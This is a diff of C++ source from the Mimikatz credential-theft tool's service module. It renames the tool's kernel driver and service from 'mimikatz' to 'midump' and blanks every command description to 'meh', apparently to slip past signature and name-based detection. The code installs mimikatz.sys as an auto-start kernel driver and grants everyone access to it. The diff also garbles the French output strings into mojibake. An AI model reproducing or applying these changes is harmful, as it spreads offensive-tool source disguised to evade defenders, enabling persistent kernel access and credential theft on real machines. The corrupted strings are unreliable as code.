@@ -8,23 +8,23 @@
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_service::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,		L"list",		L"Liste les services et pilotes"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(start,		L"start",		L"Démarre un service ou pilote"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(stop,		L"stop",		L"Arrête un service ou pilote"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(remove,		L"remove",		L"Supprime un service ou pilote"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mimikatz,	L"mimikatz",	L"Installe et/ou démarre le pilote mimikatz"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,		L"list",		L"meh"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(start,		L"start",		L"meh"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(stop,		L"stop",		L"meh"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(remove,		L"remove",		L"meh"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(midump,	L"midump",	L"meh"));
 	return monVector;
 }
 
 bool mod_mimikatz_service::start(vector<wstring> * arguments)
 {
-	(*outputStream) << L"Démarrage de \'";
+	(*outputStream) << L"Dï¿½marrage de \'";
 	return genericFunction(mod_service::start, arguments);
 }
 
 bool mod_mimikatz_service::stop(vector<wstring> * arguments)
 {
-	(*outputStream) << L"Arrêt de \'";
+	(*outputStream) << L"Arrï¿½t de \'";
 	return genericFunction(mod_service::stop, arguments);
 }
 
@@ -141,11 +141,11 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 	if(SC_HANDLE monManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
 	{
 		SC_HANDLE monService = NULL;
-		if(!(monService = OpenService(monManager, L"mimikatz", SERVICE_START)))
+		if(!(monService = OpenService(monManager, L"midump", SERVICE_START)))
 		{
 			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
 			{
-				(*outputStream) << L"[*] Pilote mimikatz non présent, installation." << endl;
+				(*outputStream) << L"[*] Pilote midump non prï¿½sent, installation." << endl;
 				
 				wstring monPilote = L"mimikatz.sys";
 				wstring monPiloteComplet = L"";
@@ -154,37 +154,37 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 					bool fileExist = false;
 					if(mod_system::isFileExist(monPiloteComplet, &fileExist) && fileExist)
 					{
-						if(monService = CreateService(monManager, L"mimikatz", L"mimikatz driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
+						if(monService = CreateService(monManager, L"midump", L"midump driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
 						{
-							(*outputStream) << L"[+] Création du pilote : OK" << endl;
+							(*outputStream) << L"[+] Crï¿½ation du pilote : OK" << endl;
 							if(mod_secacl::addWorldToMimikatz(&monService))
 								(*outputStream) << L"[+] Attribution des droits : OK";
 							else
 								(*outputStream) << L"[-] Attribution des droits : KO ; " << mod_system::getWinError();
 							(*outputStream) << endl;
 						}
-						else (*outputStream) << L"[!] Impossible de créer le pilote ; " << mod_system::getWinError() << endl;
+						else (*outputStream) << L"[!] Impossible de crï¿½er le pilote ; " << mod_system::getWinError() << endl;
 					}
 					else (*outputStream) << L"[!] Le pilote ne semble pas exister ; " << mod_system::getWinError() << endl;
 				}
 				else (*outputStream) << L"[!] Impossible d\'obtenir le chemin absolu du pilote ; " << mod_system::getWinError() << endl;
 			}
-			else (*outputStream) << L"[!] Ouverture du pilote mimikatz : KO ; " << mod_system::getWinError() << endl;
+			else (*outputStream) << L"[!] Ouverture du pilote midump : KO ; " << mod_system::getWinError() << endl;
 		}
-		else (*outputStream) << L"[*] Pilote mimikatz déjà présent" << endl;
+		else (*outputStream) << L"[*] Pilote midump dï¿½jï¿½ prï¿½sent" << endl;
 		
 		if(monService)
 		{
 			if(StartService(monService, 0, NULL) != 0)
-				(*outputStream) << L"[+] Démarrage du pilote : OK";
+				(*outputStream) << L"[+] Dï¿½marrage du pilote : OK";
 			else
-				(*outputStream) << L"[-] Démarrage du pilote : KO ; " << mod_system::getWinError();
+				(*outputStream) << L"[-] Dï¿½marrage du pilote : KO ; " << mod_system::getWinError();
 			(*outputStream) << endl;
 			CloseServiceHandle(monService);
 		}
 		
 		CloseServiceHandle(monManager);
 	}
-	else (*outputStream) << L"[!] Impossible d\'ouvrir le gestionnaire de service pour création ; " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"[!] Impossible d\'ouvrir le gestionnaire de service pour crï¿½ation ; " << mod_system::getWinError() << endl;
 	return true;
 }
